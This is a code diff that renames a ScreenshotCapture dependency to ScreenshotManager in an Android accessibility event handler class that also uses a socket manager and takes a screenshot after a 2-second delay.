@@ -24,22 +24,22 @@ public class AccessibilityEventHandler {
     private static final long DELAY_MS = 2000;
 
     private final Handler handler = new Handler(Looper.getMainLooper());
-    private final ScreenshotCapture screenshotCapture;
+    private final ScreenshotManager screenshotManager;
     private final SocketManager socketManager;
     private final SimpleDateFormat timestampFormat = new SimpleDateFormat("HH:mm:ss", Locale.getDefault());
 
     private String pendingText = "";
     private final Runnable executeRunnable;
 
-    public AccessibilityEventHandler(ScreenshotCapture screenshotCapture, SocketManager socketManager) {
-        if (screenshotCapture == null) {
-            throw new IllegalArgumentException("ScreenshotCapture cannot be null");
+    public AccessibilityEventHandler(ScreenshotManager screenshotManager, SocketManager socketManager) {
+        if (screenshotManager == null) {
+            throw new IllegalArgumentException("ScreenshotManager cannot be null");
         }
         if (socketManager == null) {
             throw new IllegalArgumentException("SocketManager cannot be null");
         }
 
-        this.screenshotCapture = screenshotCapture;
+        this.screenshotManager = screenshotManager;
         this.socketManager = socketManager;
 
         this.executeRunnable = () -> {
@@ -59,7 +59,7 @@ public class AccessibilityEventHandler {
             }
 
             // Always capture screenshot after delay
-            screenshotCapture.takeScreenshot(new ScreenshotCapture.ScreenshotCallback() {
+            screenshotManager.takeScreenshot(new ScreenshotManager.ScreenshotCallback() {
                 @Override
                 public void onSuccess(byte[] imageData) {
                     if (imageData != null) {
